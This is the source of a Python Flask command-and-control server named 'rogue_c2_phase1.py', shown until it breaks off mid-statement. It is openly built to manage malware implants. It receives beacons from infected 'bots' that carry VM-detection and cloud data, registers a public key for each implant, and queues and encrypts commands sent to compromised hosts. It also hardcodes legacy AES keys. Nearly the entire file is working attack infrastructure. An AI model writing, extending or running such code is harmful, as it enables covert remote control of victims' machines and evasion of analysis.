#!/usr/bin/env python3
"""
rogue_c2_phase1.py - C2 Server with Phase 1 support
Enhances original rogue_c2.py to support:
- Phase 1 beacon parsing (with VM detection data)
- Per-implant public key storage
- Encrypted command distribution using implant-specific keys
- Key rotation management
- Backward compatibility with legacy implants
"""

from flask import Flask, request, jsonify, render_template_string
import threading, base64, os, socket, time
import zipfile, json
from Cryptodome.Cipher import AES
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from datetime import datetime
import subprocess
import requests
from collections import defaultdict
import hashlib
import sqlite3
from pathlib import Path

app = Flask(__name__)
app.secret_key = 'RogueC2_Phase1_v2'

# === Configuration ===
LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'      # For backward compatibility
LEGACY_EXFIL_KEY = b'magicRogueSEE!333'       # For backward compatibility

C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_PORT = 8000

# === Phase 1 Database ===
DB_PATH = "phase1_implants.db"

def init_phase1_db():
    """Initialize Phase 1 database for storing implant keys and info"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Implants table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS implants (
            implant_id TEXT PRIMARY KEY,
            implant_hash TEXT,
            public_key TEXT,
            master_key_encrypted TEXT,
            payload_key_encrypted TEXT,
            key_rotation_date DATETIME,
            key_ttl_hours INTEGER DEFAULT 24,
            phase1_enabled BOOLEAN DEFAULT 1,
            vm_detection_data TEXT,
            first_seen DATETIME,
            last_beacon DATETIME,
            beacon_count INTEGER DEFAULT 0,
            commands_sent INTEGER DEFAULT 0,
            results_received INTEGER DEFAULT 0,
            cloud_info TEXT,
            notes TEXT
        )
    ''')
    
    # Commands table (encrypted per implant)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS phase1_commands (
            command_id TEXT PRIMARY KEY,
            implant_id TEXT,
            command_type TEXT,
            command_payload TEXT,  -- Encrypted with implant's public key
            command_metadata TEXT,
            created_at DATETIME,
            executed_at DATETIME,
            result TEXT,
            status TEXT DEFAULT 'pending',
            FOREIGN KEY (implant_id) REFERENCES implants (implant_id)
        )
    ''')
    
    # Key rotation log
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS key_rotations (
            rotation_id INTEGER PRIMARY KEY AUTOINCREMENT,
            implant_id TEXT,
            old_key_hash TEXT,
            new_key_hash TEXT,
            rotated_at DATETIME,
            reason TEXT,
            FOREIGN KEY (implant_id) REFERENCES implants (implant_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    print(f"[PHASE1] Database initialized: {DB_PATH}")

# Initialize database on import
init_phase1_db()

# === Storage (compatible with original) ===
connected_bots = set()
pending_commands = defaultdict(list)
command_results = defaultdict(list)
bot_info = {}
ip_to_bot_id = {}

# === Phase 1 Helper Functions ===

def get_implant_info(implant_id):
    """Get implant info from Phase 1 database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT * FROM implants 
        WHERE implant_id = ? OR implant_hash = ?
    ''', (implant_id, implant_id))
    
    row = cursor.fetchone()
    conn.close()
    
    if row:
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    return None

def store_implant_info(implant_data):
    """Store or update implant info in Phase 1 database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    
    # Check if implant exists
    existing = get_implant_info(implant_data.get('implant_id'))
    
    if existing:
        # Update existing
        cursor.execute('''
            UPDATE implants SET
                last_beacon = ?,
                beacon_count = beacon_count + 1,
                vm_detection_data = ?,
                cloud_info = ?
            WHERE implant_id = ?
        ''', (
            now,
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            implant_data.get('implant_id')
        ))
    else:
        # Insert new
        cursor.execute('''
            INSERT INTO implants (
                implant_id, implant_hash, public_key, 
                master_key_encrypted, payload_key_encrypted,
                key_rotation_date, phase1_enabled,
                vm_detection_data, cloud_info,
                first_seen, last_beacon, beacon_count
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
        ''', (
            implant_data.get('implant_id'),
            implant_data.get('implant_hash'),
            implant_data.get('public_key', ''),
            implant_data.get('master_key_encrypted', ''),
            implant_data.get('payload_key_encrypted', ''),
            now,  # key_rotation_date
            implant_data.get('phase1_enabled', True),
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            now,  # first_seen
            now   # last_beacon
        ))
    
    conn.commit()
    conn.close()
    return True

def store_public_key(implant_id, public_key_pem):
    """Store implant's public key for encrypted command distribution"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE implants SET public_key = ?
        WHERE implant_id = ? OR implant_hash = ?
    ''', (public_key_pem, implant_id, implant_id))
    
    conn.commit()
    conn.close()
    return True

def get_implant_public_key(implant_id):
    """Get implant's public key for encryption"""
    implant = get_implant_info(implant_id)
    if implant and implant.get('public_key'):
        return RSA.import_key(implant['public_key'])
    return None

def encrypt_for_implant(implant_id, data):
    """Encrypt data for specific implant using its public key"""
    public_key = get_implant_public_key(implant_id)
    if not public_key:
        # Fallback to legacy encryption
        return legacy_encrypt(data)
    
    cipher = PKCS1_OAEP.new(public_key)
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    # RSA has size limits, so we'll encrypt a symmetric key
    from Cryptodome.Random import get_random_bytes
    from Cryptodome.Cipher import AES
    import base64
    
    # Generate random AES key
    aes_key = get_random_bytes(32)
    cipher_aes = AES.new(aes_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    
    # Encrypt AES key with RSA
    encrypted_aes_key = cipher.encrypt(aes_key)
    
    # Package everything
    package = {
        'encrypted_key': base64.b64encode(encrypted_aes_key).decode('utf-8'),
        'nonce': base64.b64encode(cipher_aes.nonce).decode('utf-8'),
        'tag': base64.b64encode(tag).decode('utf-8'),
        'ciphertext': base64.b64encode(ciphertext).decode('utf-8')
    }
    
    return json.dumps(package)

def legacy_encrypt(msg):
    """Legacy encryption for backward compatibility"""
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def legacy_decrypt(data):
    """Legacy decryption for backward compatibility"""
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

def decrypt_beacon(data, implant_id=None):
    """
    Decrypt beacon data, trying Phase 1 first, then legacy
    Returns: (decrypted_data, used_phase1)
    """
    # Try to parse as JSON (Phase 1 format)
    try:
        data_str = data.decode('utf-8') if isinstance(data, bytes) else data
        parsed = json.loads(data_str)
        
        # Check if it's Phase 1 encrypted package
        if 'encrypted_key' in parsed and 'ciphertext' in parsed:
            if not implant_id:
                return None, False
            
            # Try Phase 1 decryption (would need private key - not stored)
            # For now, we'll handle Phase 1 beacons differently
            return data_str, True
    except:
        pass
    
    # Try legacy decryption
    try:
        decrypted = legacy_decrypt(data)
        return decrypted, False
    except:
        return None, False

def get_bot_id(client_ip, implant_id=None):
    """Get or create consistent bot ID for an implant"""
    # Use implant_id as primary identifier for Phase 1
    if implant_id:
        bot_id = f"phase1_{implant_id}"
        ip_to_bot_id[bot_id] = bot_id
        return bot_id
    
    # Fallback: use IP with hash if no implant_id
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    identifier = client_ip
    bot_hash = hashlib.md5(identifier.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

# ==================== PHASE 1 FLASK ROUTES ====================

@app.route('/phase1/beacon', methods=['POST'])
def phase1_beacon():
    """
    Handle Phase 1 beacons with enhanced data
    Supports both Phase 1 and legacy beacons
    """
    try:
        client_ip = request.remote_addr
        data = request.get_data()
        
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        # Try to decrypt
        decrypted, used_phase1 = decrypt_beacon(data)
        
        if not decrypted:
            # Couldn't decrypt with either method
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
        
        if used_phase1:
            # Phase 1 beacon (JSON format)
            beacon_data = json.loads(decrypted)
            implant_id = beacon_data.get('implant_id')
            implant_hash = beacon_data.get('implant_hash')
            
            # Store in Phase 1 database
            store_implant_info(beacon_data)
            
            # Get bot ID
            bot_id = get_bot_id(client_ip, implant_id or implant_hash)
            
            # Add to connected bots
            connected_bots.add(bot_id)
            
            # Update bot info (compatible with original)
            if bot_id not in bot_info:
                bot_info[bot_id] = {
                    'ip': client_ip,
                    'implant_id': implant_id,
                    'implant_hash': implant_hash,
                    'phase1_enabled': True,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'cloud_info': beacon_data.get('cloud_info', {}),
                    'vm_detection': beacon_data.get('vm_detection', {})
                }
            
            bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            bot_info[bot_id]['beacon_count'] = bot_info[bot_id].get('beacon_count', 0) + 1
            
            # Check for pending commands
            pending = pending_commands.get(bot_id, [])
            
            # Prepare response
            response = {
                'commands': pending,
                'message': 'Phase 1 beacon received',
                'timestamp': datetime.now().isoformat(),
                'phase1_supported': True
            }
            
            # Clear pending commands after sending
            if pending:
                pending_commands[bot_id] = []
            
            # Encrypt response for implant
            if beacon_data.get('phase1_enabled', True):
                # Try Phase 1 encryption
                try:
                    encrypted_response = encrypt_for_implant(implant_id or implant_hash, json.dumps(response))
                    return encrypted_response, 200
                except:
                    # Fallback to legacy
                    pass
            
            # Legacy encryption fallback
            return legacy_encrypt(json.dumps(response)), 200
            
        else:
            # Legacy beacon
            if decrypted == "beacon":
                bot_id = get_bot_id(client_ip)
                connected_bots.add(bot_id)
                
                if bot_id not in bot_info:
                    bot_info[bot_id] = {
                        'ip': client_ip,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 0,
                        'commands_sent': 0,
                        'results_received': 0,
                        'implant_id': 'unknown',
                        'phase1_enabled': False
                    }
                
                bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                bot_info[bot_id]['beacon_count'] += 1
                
                pending = pending_commands.get(bot_id, [])
                response = {'commands': pending}
                
                if pending:
                    pending_commands[bot_id] = []
                
                return legacy_encrypt(json.dumps(response)), 200
            
            # Handle other legacy commands
            return legacy_encrypt(json.dumps({'error': 'Unknown command'})), 400
            
    except Exception as e:
        print(f"[PHASE1 BEACON] Error: {e}")
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

@app.route('/phase1/register', methods=['POST'])
def phase1_register():
    """
    Register Phase 1 implant public key
    Called when implant first establishes connection
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        implant_id = data.get('implant_id')
        public_key = data.get('public_key')
        
        if not implant_id or not public_key:
            return jsonify({'error': 'Missing implant_id or public_key'}), 400
        
        # Store public key
        store_public_key(implant_id, public_key)
        
        return jsonify({
            'success': True,
            'message': 'Public key registered',
            'implant_id': implant_id
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/command', methods=['POST'])
def phase1_add_command():
    """
    Add command for Phase 1 implant
    Command will be encrypted with implant's public key
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        implant_id = data.get('implant_id')
        command_type = data.get('type')
        command_payload = data.get('payload', {})
        
        if not implant_id or not command_type:
            return jsonify({'error': 'Missing implant_id or command type'}), 400
        
        # Generate command ID
        import uuid
        command_id = str(uuid.uuid4())[:8]
        
        # Create command
        command = {
            'id': command_id,
            'type': command_type,
            'payload': command_payload,
            'timestamp': datetime.now().isoformat()
        }
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO phase1_commands 
            (command_id, implant_id, command_type, command_payload, command_metadata, created_at, status)
            VALUES (?, ?, ?, ?, ?, ?, 'pending')
        ''', (
            command_id,
            implant_id,
            command_type,
            json.dumps(command_payload),
            json.dumps({'source': 'web_interface'}),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        
        # Also add to pending_commands for immediate delivery
        bot_id = get_bot_id(request.remote_addr, implant_id)
        pending_commands[bot_id].append(command)
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': f'Command added for implant {implant_id}'
        }), 200
        
    except Exception as e:
        return jsonify({'